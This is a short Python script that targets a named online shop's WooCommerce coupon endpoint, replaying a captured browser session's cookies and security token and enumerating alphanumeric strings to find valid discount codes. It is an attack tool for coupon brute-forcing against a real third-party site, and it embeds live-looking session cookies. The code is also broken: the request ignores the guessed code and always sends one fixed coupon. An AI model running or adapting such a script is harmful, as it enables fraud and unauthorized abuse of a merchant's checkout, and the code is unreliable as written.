# importing the requests library
import requests

# defining the api-endpoint
API_ENDPOINT = "https://www.buymoda.org/?wc-ajax=apply_coupon"

headers = {'accept': 'text/html, */*; q=0.01',
           'accept-encoding': 'gzip, deflate, br',
           'accept-language': 'en,en-US;q=0.9,zh-TW;q=0.8,zh;q=0.7',
           'content-length': '36',
           'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
           'cookie': '__cfduid=ddfdf2119e806c0f9fb0d31cdeb44ad811590487671; _ga=GA1.2.1954146591.1590487678; beeketing_cart_fragments_init=1; distinct_id=9993325_1590487678488_1898; cbox_condition_popup_status=1; cbox_second_page_popup_was_closed=0; _beeketing_cart_token=1xp4oim1nqh; cbox_first_page_popup_was_closed=1; cbox_new_visitor={%22status%22:false%2C%22created_at%22:1590487678535}; bkeh=YnV5bW9kYUB0cnVib2kuMzNtYWlsLmNvbQ==; ip_country=CA; last_lv=2020_5; bk_cart={%22t%22:%221xp4oim1nqh%22%2C%22s%22:[]%2C%22a%22:[]%2C%22i%22:[]}; _gid=GA1.2.1635982719.1592084514; affwp_ref_visit_id=299550; affwp_ref=62; woocommerce_items_in_cart=1; wp_woocommerce_session_6234fbdb1478f838cbbac4e27bce8501=75d4787d5939d2cafd79fd85783c7f1b%7C%7C1592283191%7C%7C1592279591%7C%7Ca8174d5f4bfa8ec4cc191f25a5f5d4e5; woocommerce_cart_hash=dd30851d53024253e693901a6aa6c655; wjecf_free_product_coupons=%5B%5D',
           'dnt': '1',
           'origin': 'https://www.buymoda.org',
           'referer': 'https://www.buymoda.org/checkout/',
           'sec-ch-ua': '"\\Not\"A;Brand";v="99", "Chromium";v="84", "Google Chrome";v="84"',
           'sec-ch-ua-mobile': '?0',
           'sec-fetch-dest': 'empty',
           'sec-fetch-mode': 'cors',
           'sec-fetch-site': 'same-origin',
           'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.45 Safari/537.36',
           'x-requested-with': 'XMLHttpRequest'
           }

# Imports
import itertools
import time

stringType = "1234567890abcdefghijklmnopqrstuvwxyz"

import sys

sys.stdout = open('file', 'w')


def callAPI(code):
    # data to be sent to api
    data = {'security': '37c4e05ef1',
            'coupon_code': 'md15'
            }
    # sending post request and saving response as response object
    r = requests.post(url=API_ENDPOINT, data=data, headers=headers)
    # extracting response text
    pastebin_url = r.text
    if "does not exist" not in pastebin_url:
        print(code)


def tryPassword(stringTypeSet):
    start = time.time()
    chars = stringTypeSet
    attempts = 0
    for i in range(1, 2):
        for letter in itertools.product(chars, repeat=i):
            attempts += 1
            letter = ''.join(letter)
            callAPI(letter)


tryPassword(stringType)
